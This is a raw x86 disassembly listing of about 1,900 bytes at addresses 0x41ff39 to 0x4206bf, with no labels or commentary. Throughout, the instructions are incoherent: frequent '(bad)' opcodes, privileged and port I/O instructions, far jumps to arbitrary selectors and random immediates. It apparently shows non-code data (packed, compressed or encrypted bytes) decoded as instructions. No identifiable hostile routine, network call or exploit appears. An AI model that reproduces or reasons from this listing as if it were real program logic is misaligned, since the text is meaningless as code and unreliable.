  41ff39:	cmp    al,BYTE PTR [esi-0x47bcb0a4]
  41ff3f:	lahf   
  41ff40:	or     al,0xe9
  41ff42:	addr16 cld 
  41ff44:	pop    edx
  41ff45:	inc    ebx
  41ff46:	inc    ebx
  41ff47:	iret   
  41ff48:	pop    ds
  41ff49:	mov    ebp,0xc46f3b12
  41ff4e:	mov    esi,0xfddac4cf
  41ff53:	bsf    ecx,DWORD PTR [esp+edx*8]
  41ff57:	pop    ebx
  41ff58:	mov    bh,0x25
  41ff5a:	sbb    DWORD PTR [edi-0x36],esp
  41ff5d:	in     al,dx
  41ff5e:	popf   
  41ff5f:	add    esi,esp
  41ff61:	das    
  41ff62:	sbb    al,0x25
  41ff64:	icebp  
  41ff65:	push   edi
  41ff66:	es mov ah,0x8a
  41ff69:	jnp    0x41ffdb
  41ff6b:	in     al,dx
  41ff6c:	dec    ebx
  41ff6d:	stos   BYTE PTR es:[edi],al
  41ff6e:	cwde   
  41ff6f:	inc    esi
  41ff70:	cmp    DWORD PTR [esi],ebx
  41ff72:	mov    ebp,0xe6909690
  41ff77:	lahf   
  41ff78:	cmp    ebx,ebp
  41ff7a:	imul   bp,cx,0x6ead
  41ff7f:	(bad)  
  41ff80:	cmp    DWORD PTR [eax-0x56],esp
  41ff83:	jp     0x41ffad
  41ff85:	and    al,BYTE PTR [esi-0x5e92eb]
  41ff8b:	ins    BYTE PTR es:[edi],dx
  41ff8c:	sub    eax,0x2bc7cdef
  41ff91:	jno    0x41ff9e
  41ff93:	(bad)  
  41ff94:	je     0x41ff9f
  41ff96:	(bad)  
  41ff97:	xor    DWORD PTR [edi+ebx*8+0x28],esi
  41ff9b:	lds    ebp,FWORD PTR [eax+0x372b0453]
  41ffa1:	pop    esi
  41ffa2:	in     al,0x17
  41ffa4:	sbb    bl,bh
  41ffa6:	jns    0x41ff9d
  41ffa8:	dec    esi
  41ffa9:	jecxz  0x420022
  41ffab:	pop    esp
  41ffac:	pop    eax
  41ffad:	push   esp
  41ffae:	mov    dh,0x6b
  41ffb0:	mov    edx,0x8b0f5ea1
  41ffb5:	stos   DWORD PTR es:[edi],eax
  41ffb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffb7:	jg     0x41ffb9
  41ffb9:	xchg   ebp,eax
  41ffba:	sub    BYTE PTR [edx+0x659641c5],bh
  41ffc0:	xchg   DWORD PTR [edx-0x6b485e64],ebp
  41ffc6:	mov    al,0xfc
  41ffc8:	xchg   ecx,eax
  41ffc9:	int3   
  41ffca:	aad    0x7a
  41ffcc:	add    eax,DWORD PTR [ebx]
  41ffce:	xor    ch,BYTE PTR [esi+0x26268f60]
  41ffd4:	add    DWORD PTR [edx+0x28],ebp
  41ffd7:	in     al,0xc4
  41ffd9:	jne    0x420032
  41ffdb:	cmp    edi,ecx
  41ffdd:	mov    dh,BYTE PTR [ecx+0xae60ad9]
  41ffe3:	jp     0x41ffa7
  41ffe5:	cmp    eax,0x11126687
  41ffea:	ss sti 
  41ffec:	stos   BYTE PTR es:[edi],al
  41ffed:	fistp  QWORD PTR [edi+eax*4-0x1e]
  41fff1:	(bad)  
  41fff2:	adc    edi,DWORD PTR [ecx+0x1b]
  41fff5:	test   al,0x36
  41fff7:	mov    cl,0xfd
  41fff9:	push   edx
  41fffa:	out    dx,eax
  41fffb:	jnp    0x41ffbc
  41fffd:	jmp    0x8316:0x9271a7f0
  420004:	push   cs
  420005:	cmp    BYTE PTR [eax-0x68],0x6f
  420009:	fidiv  WORD PTR [edx-0x61]
  42000c:	push   ebx
  42000d:	lods   al,BYTE PTR ds:[esi]
  42000e:	imul   ebp,ebp,0x2
  420011:	hlt    
  420012:	push   cs
  420013:	inc    edi
  420014:	pop    ss
  420015:	out    dx,eax
  420016:	shl    esp,cl
  420018:	cwde   
  420019:	inc    edi
  42001a:	fistp  WORD PTR [ecx+esi*8+0x45]
  42001e:	pop    es
  42001f:	xor    al,0x1f
  420021:	sbb    ebx,DWORD PTR [eax]
  420023:	pop    esi
  420024:	mov    ebp,ecx
  420026:	mov    bl,0x56
  420028:	pop    edx
  420029:	pop    ss
  42002a:	mov    edx,0x544dc381
  42002f:	sbb    al,0x14
  420031:	add    eax,0x7fd68d1c
  420036:	shl    DWORD PTR [ebx],0xf3
  420039:	xchg   ebp,eax
  42003a:	fadd   DWORD PTR [edx]
  42003c:	pop    ebp
  42003d:	in     al,dx
  42003e:	cmp    BYTE PTR [eax-0x1c],ch
  420041:	bound  edi,QWORD PTR [ebx+ebx*4+0x5c]
  420045:	sahf   
  420046:	mov    es,ecx
  420048:	mov    DWORD PTR [ebx-0x126e5cff],ebp
  42004e:	mov    ebp,edi
  420050:	jmp    0xfaae69f8
  420055:	sub    al,0x3
  420057:	in     eax,dx
  420058:	lods   eax,DWORD PTR ds:[esi]
  420059:	inc    edx
  42005a:	inc    esp
  42005b:	mov    ch,0xd3
  42005d:	xor    al,0x8
  42005f:	push   edi
  420060:	lahf   
  420061:	jl     0x420076
  420063:	jns    0x420068
  420065:	jmp    0x502c5b13
  42006a:	(bad)  
  42006b:	(bad)  
  42006c:	mov    cl,0x98
  42006e:	neg    BYTE PTR [ebx+esi*4-0x4e32e7a6]
  420075:	(bad)  
  420076:	stc    
  420077:	in     al,0x7c
  420079:	jb     0x420052
  42007b:	push   edi
  42007c:	inc    eax
  42007d:	xchg   ebx,eax
  42007e:	stos   BYTE PTR es:[edi],al
  42007f:	pop    edi
  420080:	cli    
  420081:	dec    esp
  420082:	push   ebx
  420083:	mov    cl,0xbb
  420085:	xchg   esi,eax
  420086:	cmp    eax,0x221da599
  42008b:	pop    es
  42008c:	shl    ecx,1
  42008e:	jne    0x4200b4
  420090:	jb     0x4200ac
  420092:	ins    BYTE PTR es:[edi],dx
  420093:	fwait
  420094:	sub    DWORD PTR [ecx-0x650f3f5c],edi
  42009a:	ds loopne 0x42007a
  42009d:	mov    DWORD PTR [ecx-0x6b11d600],ebp
  4200a3:	mov    ecx,0x12e3b880
  4200a8:	jbe    0x420096
  4200aa:	or     esi,DWORD PTR [ecx-0x5e]
  4200ad:	gs adc dh,ah
  4200b0:	(bad)  
  4200b1:	mov    edi,0x942b66b8
  4200b6:	and    esp,esi
  4200b8:	fild   QWORD PTR [esi-0x69eb325f]
  4200be:	mov    esi,0x50404b73
  4200c3:	sti    
  4200c4:	out    0x7f,al
  4200c6:	sbb    eax,0xf0db4436
  4200cb:	aaa    
  4200cc:	xchg   dl,bl
  4200ce:	iret   
  4200cf:	adc    BYTE PTR [edx-0x13],0x28
  4200d3:	fldenv [edi-0x271a88ab]
  4200d9:	mov    dh,0x79
  4200db:	sub    BYTE PTR [eax],0x4
  4200de:	mov    dl,0x3
  4200e0:	dec    ebp
  4200e1:	sub    eax,0xb29643b8
  4200e6:	lods   al,BYTE PTR ds:[esi]
  4200e7:	test   eax,esp
  4200e9:	mov    ecx,DWORD PTR [edi]
  4200eb:	je     0x420116
  4200ed:	mov    eax,ds:0x86430ddc
  4200f2:	ins    BYTE PTR es:[edi],dx
  4200f3:	push   ds
  4200f4:	sub    DWORD PTR [ebx+0x1f],0x42
  4200f8:	out    dx,eax
  4200f9:	dec    edi
  4200fa:	fisubr DWORD PTR [eax+0x4b0b70a7]
  420100:	jbe    0x42011a
  420102:	cmp    BYTE PTR [ebp+0xa],dh
  420105:	pop    ebp
  420106:	cmp    dh,BYTE PTR [ecx+0x12]
  420109:	xchg   esp,eax
  42010a:	icebp  
  42010b:	popa   
  42010c:	sbb    al,0xec
  42010e:	je     0x420122
  420110:	fadd   DWORD PTR [eax+0x8]
  420113:	push   cs
  420114:	sbb    DWORD PTR [edi-0x7df75361],esp
  42011a:	out    0xd1,al
  42011c:	mov    WORD PTR [edx+0x25],ss
  42011f:	popa   
  420120:	xor    esp,ebp
  420122:	jmp    FWORD PTR [ebx]
  420124:	push   ebp
  420125:	jbe    0x420112
  420127:	cmp    al,0x9a
  420129:	bound  edx,QWORD PTR [ecx+0x7]
  42012c:	(bad)  
  42012d:	ja     0x4200f0
  42012f:	adc    ebp,DWORD PTR [edi+esi*1+0x3a]
  420133:	add    DWORD PTR [edi-0x46],edx
  420136:	mov    BYTE PTR [esi+0x76edf060],al
  42013c:	jl     0x4201a3
  42013e:	mov    ds:0x15e2b2e,eax
  420143:	scas   eax,DWORD PTR es:[edi]
  420144:	mov    eax,0x56f49a8c
  420149:	push   es
  42014a:	jle    0x4201bd
  42014c:	mov    edi,0x79b1f48b
  420151:	and    BYTE PTR [edx-0xedcdc92],dl
  420157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420158:	cs push ecx
  42015a:	jne    0x4200e2
  42015c:	pop    ds
  42015d:	mov    ecx,DWORD PTR [edx+0x8]
  420160:	xchg   ebx,eax
  420161:	in     al,0xd3
  420163:	test   DWORD PTR [ecx+eiz*4-0x4f],eax
  420167:	mov    ebp,0xe7a83215
  42016c:	das    
  42016d:	bound  esi,QWORD PTR [ecx+ebx*4]
  420170:	aaa    
  420171:	call   0x9b7:0x164f00ad
  420178:	bound  eax,QWORD PTR [ebx+0x282757d9]
  42017e:	aaa    
  42017f:	jmp    0x42012e
  420181:	sbb    bh,BYTE PTR [esi]
  420183:	ror    DWORD PTR [ebx-0x33af908e],1
  420189:	push   esp
  42018a:	sub    ch,al
  42018c:	or     DWORD PTR [ecx],0xffffffb5
  42018f:	loope  0x420173
  420191:	pop    ebp
  420192:	ret    0x1bba
  420195:	sbb    DWORD PTR [ecx-0x52],eax
  420198:	imul   eax,eax,0x5a
  42019b:	inc    ebp
  42019c:	loopne 0x42016c
  42019e:	mov    WORD PTR [esi+0x301c16e7],es
  4201a4:	adc    eax,eax
  4201a6:	mov    cl,ah
  4201a8:	add    al,0x65
  4201aa:	ffreep st(7)
  4201ac:	mov    ch,0x90
  4201ae:	jge    0x4201fb
  4201b0:	adc    dx,WORD PTR ds:0xd0ff8f8a
  4201b7:	out    dx,eax
  4201b8:	mov    DWORD PTR [edi],ebp
  4201ba:	scas   al,BYTE PTR es:[edi]
  4201bb:	out    dx,al
  4201bc:	mov    cs,WORD PTR [edx]
  4201be:	retf   0x96a4
  4201c1:	mov    al,ds:0x5871652a
  4201c6:	daa    
  4201c7:	push   ss
  4201c8:	lds    esi,FWORD PTR [ebp+0x7f]
  4201cb:	and    bh,BYTE PTR [ecx-0x54aa8530]
  4201d1:	adc    eax,0xbdd8e2a6
  4201d6:	in     eax,0x1e
  4201d8:	mov    eax,ds:0x326d8ded
  4201dd:	sbb    DWORD PTR [bp+si-0x7f3],0x55b7c407
  4201e6:	loope  0x42021e
  4201e8:	pop    ebp
  4201e9:	mov    eax,ds:0x96987875
  4201ee:	cs and ecx,esi
  4201f1:	data16 fidivr WORD PTR [edi+ecx*2+0x25ef82d1]
  4201f9:	xor    DWORD PTR [edi],0xffffffa4
  4201fc:	inc    ebx
  4201fd:	adc    cl,dh
  4201ff:	xor    bh,BYTE PTR [edi]
  420201:	mov    cs,WORD PTR ds:0xb9bf2bf
  420207:	xor    ah,BYTE PTR [edi-0x54]
  42020a:	and    DWORD PTR [edi],ebp
  42020c:	fdivr  st(6),st
  42020e:	ds push ecx
  420210:	outs   dx,DWORD PTR ds:[esi]
  420211:	lock out dx,eax
  420213:	inc    edx
  420214:	loop   0x4201ce
  420216:	test   BYTE PTR [ebp+0x78e0d914],0x83
  42021d:	or     edx,DWORD PTR [edi+0x7b]
  420220:	mov    ch,0xf9
  420222:	retf   0xd424
  420225:	lods   eax,DWORD PTR ds:[esi]
  420226:	stos   BYTE PTR es:[edi],al
  420227:	(bad)  [ebx-0x6cff0e9b]
  42022d:	sub    DWORD PTR [edx],0x4d771740
  420233:	loopne 0x42021d
  420235:	aas    
  420236:	pop    eax
  420237:	sbb    al,0x17
  420239:	mov    al,0x47
  42023b:	add    ch,BYTE PTR [edi+0x60]
  42023e:	test   al,0xce
  420240:	call   0xb594f77e
  420245:	test   BYTE PTR [eax+0x1aff2dfb],cl
  42024b:	out    dx,al
  42024c:	xchg   ebx,eax
  42024d:	adc    ebx,DWORD PTR [ebx+0x3a7988a3]
  420253:	popa   
  420254:	mov    ebx,0x3e3dc64a
  420259:	xor    BYTE PTR [ebx+ebp*1-0x386e7b80],dh
  420260:	add    cl,al
  420262:	add    ebx,DWORD PTR [ecx+0x4b]
  420265:	lods   eax,DWORD PTR ds:[esi]
  420266:	mov    eax,ds:0x60027d2b
  42026b:	mov    ecx,0xce4531a1
  420270:	lods   eax,DWORD PTR ds:[esi]
  420271:	dec    edx
  420272:	jmp    0x632f43d5
  420277:	and    eax,0x9ba27dc2
  42027c:	xchg   edx,eax
  42027d:	inc    ecx
  42027e:	jmp    0x4202d9
  420280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420281:	cmp    DWORD PTR [edi+0x6d],edx
  420284:	push   eax
  420285:	add    eax,0x22f55cfc
  42028a:	aaa    
  42028b:	ds xor dl,bl
  42028e:	xchg   ebp,eax
  42028f:	xchg   DWORD PTR [edx],ecx
  420291:	lods   eax,DWORD PTR ds:[esi]
  420292:	aaa    
  420293:	mov    ds:0x5408b2d3,eax
  420298:	ret    0x3612
  42029b:	inc    esp
  42029c:	cwde   
  42029d:	fwait
  42029e:	mov    eax,0x8cf3f565
  4202a3:	cmp    bh,cl
  4202a5:	test   BYTE PTR [ebx],0xf4
  4202a8:	fcomp  DWORD PTR [edx+0x4e]
  4202ab:	mov    ds:0x5ff37747,eax
  4202b0:	xchg   ebp,eax
  4202b1:	call   0xa6f5:0x784087a6
  4202b8:	out    0x2,eax
  4202ba:	scas   eax,DWORD PTR es:[edi]
  4202bb:	mov    ebp,0x8d745b10
  4202c0:	pop    ecx
  4202c1:	xor    BYTE PTR [ebx-0x40],ch
  4202c4:	mov    ah,0xd1
  4202c6:	xor    ebp,DWORD PTR [edi-0x1d]
  4202c9:	jo     0x4202fc
  4202cb:	ds (bad) 
  4202cd:	stos   BYTE PTR es:[edi],al
  4202ce:	mov    ecx,0x228c8e40
  4202d3:	(bad)  
  4202d5:	sti    
  4202d6:	daa    
  4202d7:	jnp    0x4202b2
  4202d9:	es jno 0x420347
  4202dc:	sub    ebp,DWORD PTR [esi+ecx*1]
  4202df:	adc    eax,DWORD PTR [edi-0x51]
  4202e2:	unpckhps xmm4,xmm2
  4202e5:	sub    al,0x6b
  4202e7:	stos   BYTE PTR es:[edi],al
  4202e8:	div    ebx
  4202ea:	pop    ss
  4202eb:	dec    esi
  4202ec:	push   edi
  4202ed:	mov    ah,BYTE PTR [esi-0x42e9d5c7]
  4202f3:	cwd    
  4202f5:	je     0x42029e
  4202f7:	inc    edi
  4202f8:	sbb    al,0x36
  4202fa:	pop    ss
  4202fb:	scas   al,BYTE PTR es:[edi]
  4202fc:	push   es
  4202fd:	test   DWORD PTR [ecx],ebx
  4202ff:	(bad)  
  420300:	shl    BYTE PTR [edx+ecx*8-0x1a],cl
  420304:	dec    esi
  420305:	arpl   WORD PTR [esi+eiz*2+0x50da7a08],cx
  42030c:	jle    0x420324
  42030e:	add    bl,bl
  420310:	data16 xchg dl,ah
  420313:	sar    BYTE PTR [edx-0x626d139c],1
  420319:	jl     0x420317
  42031b:	pop    eax
  42031c:	pop    esi
  42031d:	push   edx
  42031e:	or     edx,esp
  420320:	dec    ebx
  420321:	jp     0x4202b0
  420323:	dec    esp
  420324:	jecxz  0x42034d
  420326:	ret    
  420327:	int    0xdb
  420329:	xor    BYTE PTR [ecx-0x13207dee],0xa2
  420330:	ror    BYTE PTR [ebx],0xd5
  420333:	push   ebx
  420334:	pushf  
  420335:	pop    ss
  420336:	sub    ecx,DWORD PTR [edx+0x4f]
  420339:	adc    DWORD PTR [edi],0x3c0c7153
  42033f:	mov    al,0xd5
  420341:	out    dx,al
  420342:	nop
  420343:	mov    esp,ebx
  420345:	pop    eax
  420346:	ss mov ebx,0x2cbbfc60
  42034c:	jl     0x420345
  42034e:	xor    al,0x9c
  420350:	imul   ebx,DWORD PTR [edx+ebx*8],0x53cc6794
  420357:	pusha  
  420358:	push   esp
  420359:	shl    DWORD PTR [eax-0x3ec009a7],0x3a
  420360:	sbb    ebp,DWORD PTR [ecx+0x30f6968]
  420366:	aaa    
  420367:	and    esp,ebp
  420369:	repz jge 0x4203de
  42036c:	fs enterw 0x4650,0xf4
  420372:	xchg   ecx,eax
  420373:	int3   
  420374:	jne    0x42031a
  420376:	or     edi,DWORD PTR [bp+0x4b]
  42037a:	xor    BYTE PTR [esi-0x98edd8b],ch
  420380:	scas   eax,DWORD PTR es:[edi]
  420381:	inc    edx
  420382:	push   ss
  420383:	jns    0x420329
  420385:	dec    esp
  420386:	pop    esp
  420387:	push   ss
  420388:	sub    ah,BYTE PTR [ebx]
  42038a:	enter  0xbcd0,0xf7
  42038e:	adc    bl,BYTE PTR [esi-0x13d61f40]
  420394:	pop    ecx
  420395:	xor    al,0xb1
  420397:	(bad)  
  420398:	sar    esp,cl
  42039a:	stc    
  42039b:	mov    al,ds:0x32c92f15
  4203a0:	cmc    
  4203a1:	jb     0x42036f
  4203a3:	jno    0x42039e
  4203a5:	cmp    DWORD PTR ds:0x36771072,ecx
  4203ab:	cmovle esp,DWORD PTR [eax-0x689434ef]
  4203b2:	mov    eax,0xeb816d51
  4203b7:	jbe    0x420429
  4203b9:	mov    edx,0x5a673c0b
  4203be:	pusha  
  4203bf:	sahf   
  4203c0:	in     eax,0x54
  4203c2:	push   es
  4203c3:	inc    BYTE PTR [esi]
  4203c5:	aam    0x2
  4203c7:	loopne 0x420423
  4203c9:	inc    esp
  4203ca:	pushf  
  4203cb:	lods   al,BYTE PTR ds:[esi]
  4203cc:	lock (bad) [esi+edi*8]
  4203d0:	jl     0x420433
  4203d2:	or     BYTE PTR [ecx+0x52],al
  4203d5:	repz jle 0x4203bc
  4203d8:	inc    esp
  4203d9:	cli    
  4203da:	aad    0x4
  4203dc:	and    BYTE PTR [edi-0xa],cl
  4203df:	pop    esp
  4203e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203e1:	mov    edx,0x72c52622
  4203e6:	jp     0x4203d0
  4203e8:	outs   dx,BYTE PTR ds:[esi]
  4203e9:	sub    bl,BYTE PTR [eax+0x1cc352e]
  4203ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f1:	cmp    ch,BYTE PTR [eax]
  4203f3:	mov    esp,0xe8ae1cdf
  4203f8:	sub    eax,esp
  4203fa:	loopne 0x4203f2
  4203fc:	sub    ah,BYTE PTR [ebp-0x59e4ada2]
  420402:	shl    DWORD PTR [esi-0x9],cl
  420405:	xlat   BYTE PTR ds:[ebx]
  420406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420408:	jns    0x42044a
  42040a:	xchg   ebp,eax
  42040b:	mov    edi,0x75c36f60
  420410:	test   DWORD PTR ds:0x923c80a2,0x3fd9d730
  42041a:	xor    bl,BYTE PTR [ebp-0x71a8a4f3]
  420420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420421:	ds icebp 
  420423:	push   edx
  420424:	add    edi,DWORD PTR [ebx+0x6e]
  420427:	cmp    dh,BYTE PTR [eax-0x7d72d407]
  42042d:	mov    eax,0xa99bc558
  420432:	aas    
  420433:	retf   
  420434:	mov    ds:0xf4c3467e,al
  420439:	inc    ebx
  42043a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42043b:	mov    ecx,0xf87555a9
  420440:	ds cmp eax,0x8b662052
  420446:	mov    bl,0x21
  420448:	cli    
  420449:	jae    0x42040b
  42044b:	or     eax,0x763008ab
  420450:	push   edi
  420451:	cmc    
  420452:	fldln2 
  420454:	xor    bl,BYTE PTR [ebx+0x60a6bcfa]
  42045a:	outs   dx,DWORD PTR ds:[esi]
  42045b:	mov    ebp,0x39a074c4
  420460:	jp     0x4204cc
  420462:	mov    dl,0x62
  420464:	fwait
  420465:	adc    al,0xd0
  420467:	lods   al,BYTE PTR ds:[esi]
  420468:	jns    0x420490
  42046a:	or     BYTE PTR [esp+edx*2+0x60],dh
  42046e:	es cmp BYTE PTR cs:[ecx],dl
  420472:	cmp    al,0x36
  420474:	stos   BYTE PTR es:[edi],al
  420475:	cmp    BYTE PTR [edi+0x58],0xf
  420479:	rcr    ecx,0xb9
  42047c:	push   ds
  42047d:	ret    0xd19d
  420480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420481:	loop   0x4204ef
  420483:	and    eax,DWORD PTR [ecx-0x3a8e701]
  420489:	mov    esp,DWORD PTR [ebp+0x1a]
  42048c:	in     eax,0xb5
  42048e:	out    dx,eax
  42048f:	loope  0x420501
  420491:	jge    0x42045b
  420493:	mov    ?,ebx
  420495:	push   edi
  420496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420497:	sub    ah,BYTE PTR [esi+0x45]
  42049a:	fisttp QWORD PTR [ebx]
  42049c:	jo     0x420506
  42049e:	sub    ebx,DWORD PTR [edi]
  4204a0:	sahf   
  4204a1:	arpl   WORD PTR [eax+0x2bdc1a5c],bx
  4204a7:	sbb    al,bh
  4204a9:	cwde   
  4204aa:	dec    edi
  4204ab:	jge    0x420460
  4204ad:	jg     0x420446
  4204af:	ret    
  4204b0:	push   esp
  4204b1:	cmp    BYTE PTR [ebp-0x43],ah
  4204b4:	(bad)  [edx-0x44]
  4204b7:	xchg   eax,ebp
  4204b9:	sbb    edi,DWORD PTR [eax-0x3a]
  4204bc:	push   esi
  4204bd:	and    edi,DWORD PTR [esi-0x712083c6]
  4204c3:	stos   BYTE PTR es:[edi],al
  4204c4:	mov    ecx,0x4b3389bd
  4204c9:	dec    edx
  4204ca:	das    
  4204cb:	jecxz  0x42047d
  4204cd:	push   cs
  4204ce:	inc    edi
  4204cf:	or     al,0x74
  4204d1:	dec    ebp
  4204d2:	push   ds
  4204d3:	test   al,0xa9
  4204d5:	mov    ebx,0x80ad03fd
  4204da:	mov    eax,ds:0x82854b71
  4204df:	add    eax,0x3051c8cf
  4204e4:	sti    
  4204e5:	lea    edi,[ebx]
  4204e7:	jno    0x42053f
  4204e9:	in     eax,0x1b
  4204eb:	jb     0x4204fc
  4204ed:	xchg   edx,eax
  4204ee:	jecxz  0x4204c3
  4204f0:	mov    ah,0x10
  4204f2:	popa   
  4204f3:	xor    eax,0x73a27df7
  4204f8:	(bad)  
  4204f9:	(bad)  
  4204fa:	loop   0x420514
  4204fc:	ja     0x42051d
  4204fe:	xchg   esp,eax
  4204ff:	outs   dx,BYTE PTR ds:[esi]
  420500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420501:	pop    edi
  420502:	xor    al,0x5a
  420504:	lea    eax,[ecx+0xbc1681d]
  42050a:	repz mov ebx,0xd71431dd
  420510:	push   ebx
  420511:	fs jp  0x420591
  420514:	cmp    esi,DWORD PTR [eax+edx*2]
  420517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420518:	aad    0x46
  42051a:	jae    0x420507
  42051c:	push   ds
  42051d:	push   ecx
  42051e:	aas    
  42051f:	or     BYTE PTR [edi],bh
  420521:	cmp    al,0x7
  420523:	test   DWORD PTR [ebx-0x3e],ecx
  420526:	jl     0x4204b9
  420528:	sti    
  420529:	imul   esi,DWORD PTR [ecx+0x3c],0x53ceac49
  420530:	enter  0xf930,0x7f
  420534:	hlt    
  420535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420536:	sub    dh,BYTE PTR [ecx-0x7a]
  420539:	dec    ecx
  42053a:	loopne 0x420503
  42053c:	stos   BYTE PTR es:[edi],al
  42053d:	push   cs
  42053e:	icebp  
  42053f:	and    DWORD PTR [edi+0x1d],esi
  420542:	hlt    
  420543:	push   ss
  420544:	add    ch,BYTE PTR [eax]
  420546:	push   ebx
  420547:	xchg   BYTE PTR [edi],ch
  420549:	lock sbb DWORD PTR ds:0xd6923a2d,esp
  420550:	inc    esp
  420551:	cld    
  420552:	cmp    al,0xa8
  420554:	mov    ecx,0x6cbbe880
  420559:	dec    esp
  42055a:	xchg   edi,eax
  42055b:	inc    ebx
  42055c:	inc    esi
  42055d:	xchg   ebx,eax
  42055e:	cmc    
  42055f:	(bad)  
  420560:	and    eax,0xd974d9ce
  420565:	cmp    DWORD PTR [eax+0xb673f92],ecx
  42056b:	push   cs
  42056c:	leave  
  42056d:	push   ebx
  42056e:	inc    edx
  42056f:	fsubr  DWORD PTR [edx+0x74]
  420572:	stc    
  420573:	xchg   DWORD PTR [eax],esp
  420575:	mov    cr0,eax
  420578:	retf   0x320d
  42057b:	and    bl,BYTE PTR [edi-0x3e83330a]
  420581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420584:	add    DWORD PTR [edx-0xa],ebp
  420587:	repz or ecx,ebp
  42058a:	retf   0x197e
  42058d:	out    0x22,al
  42058f:	popa   
  420590:	xor    DWORD PTR [ecx-0x4c],0x8e2fb055
  420597:	adc    ecx,DWORD PTR [ecx-0x10]
  42059a:	dec    eax
  42059b:	push   es
  42059c:	jnp    0x4205ab
  42059e:	fs stc 
  4205a0:	hlt    
  4205a1:	loope  0x4205bd
  4205a3:	push   ecx
  4205a4:	cmp    eax,0xe895608
  4205a9:	jb     0x42054f
  4205ab:	cld    
  4205ac:	pop    edx
  4205ad:	push   0xa6fdb53b
  4205b2:	xchg   ebp,eax
  4205b3:	in     al,0xf6
  4205b5:	popa   
  4205b6:	xor    ah,BYTE PTR [ebp-0x7e5db7b1]
  4205bc:	loopne 0x420545
  4205be:	sar    BYTE PTR [eax],cl
  4205c0:	xlat   BYTE PTR ds:[ebx]
  4205c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205c2:	cld    
  4205c3:	xor    al,0x78
  4205c5:	scas   eax,DWORD PTR es:[edi]
  4205c6:	xor    ebx,DWORD PTR [ebp+0x28]
  4205c9:	inc    eax
  4205ca:	jno    0x420618
  4205cc:	daa    
  4205cd:	popa   
  4205ce:	mov    BYTE PTR [ebp+0x31],ch
  4205d1:	(bad)  
  4205d3:	fs push cs
  4205d5:	ins    BYTE PTR es:[edi],dx
  4205d6:	adc    al,0x3a
  4205d8:	dec    esi
  4205d9:	cs ror ebx,cl
  4205dc:	(bad)  [ecx]
  4205de:	push   ebx
  4205df:	icebp  
  4205e0:	in     al,dx
  4205e1:	xchg   DWORD PTR [ebx+0x42b1f90],esp
  4205e7:	or     BYTE PTR gs:[ecx],0xbf
  4205eb:	pop    ebx
  4205ec:	je     0x42057a
  4205ee:	and    eax,0xc7cfa997
  4205f3:	mov    ch,0xeb
  4205f5:	add    DWORD PTR [bp+di-0x35aa],eax
  4205fa:	add    ch,BYTE PTR [ebx+0x6cc03f6f]
  420600:	jl     0x42064e
  420602:	xchg   BYTE PTR ds:0x2b85910b,ch
  420608:	mov    al,0x49
  42060a:	pop    ecx
  42060b:	push   esi
  42060c:	adc    dl,cl
  42060e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42060f:	mov    WORD PTR [ebx-0x6918e1f6],es
  420615:	adc    eax,0xb73fdade
  42061a:	xor    ebp,DWORD PTR [ebx+edx*4]
  42061d:	aad    0x34
  42061f:	repz adc DWORD PTR [ecx-0x12a2ea74],edx
  420626:	enter  0x1d68,0x27
  42062a:	mov    eax,ds:0xc40f42a1
  42062f:	jnp    0x420631
  420631:	sub    ecx,DWORD PTR [eax]
  420633:	xchg   BYTE PTR ds:0x8c7ed447,cl
  420639:	sbb    BYTE PTR [ecx+0x545af3f1],ah
  42063f:	out    dx,al
  420640:	inc    edi
  420641:	push   ecx
  420642:	stos   BYTE PTR es:[edi],al
  420643:	js     0x420695
  420645:	cmp    al,0x54
  420647:	mov    al,ds:0x81f356e
  42064c:	sbb    al,0x22
  42064e:	jmp    0x14c039ef
  420653:	mov    ecx,DWORD PTR [eax]
  420655:	xchg   ebp,eax
  420656:	les    esp,FWORD PTR [ecx+0x11]
  420659:	dec    edi
  42065a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42065b:	outs   dx,DWORD PTR ds:[esi]
  42065c:	mov    bl,0x19
  42065e:	repz and ebx,ecx
  420661:	sbb    ch,ah
  420663:	inc    edi
  420664:	mov    eax,ds:0xed6f46d6
  420669:	sbb    DWORD PTR [ebp+eax*2-0x687614fb],eax
  420670:	inc    esp
  420671:	push   esi
  420672:	xor    DWORD PTR [ebx+eiz*1],eax
  420675:	mov    WORD PTR [ebp+esi*4+0x3406cd45],?
  42067c:	stos   BYTE PTR es:[edi],al
  42067d:	or     ch,BYTE PTR [ebx-0x5c]
  420680:	and    DWORD PTR [esi+0x61cd61e],ebp
  420686:	cmp    BYTE PTR [esi-0x43ee09b0],dh
  42068c:	aam    0x39
  42068e:	enter  0x11a5,0x98
  420692:	(bad)  
  420693:	jp     0x42067d
  420695:	rcr    BYTE PTR [edx+0x6],1
  420698:	pushf  
  420699:	adc    BYTE PTR [edi],cl
  42069b:	push   ebp
  42069c:	out    0x30,al
  42069e:	scas   eax,DWORD PTR es:[edi]
  42069f:	pop    ds
  4206a0:	push   0xffffffdc
  4206a2:	xor    al,BYTE PTR [edi]
  4206a4:	popa   
  4206a5:	mov    esp,0xe80715ec
  4206aa:	mov    dh,0xb2
  4206ac:	in     eax,0xbe
  4206ae:	pop    eax
  4206af:	cmp    DWORD PTR [ecx+edx*1],edx
  4206b2:	nop
  4206b3:	mov    esi,0x66c534e5
  4206b8:	mov    dh,0xb1
  4206ba:	mov    esp,0x1fbe7cef
  4206bf:	xchg   ecx,eax
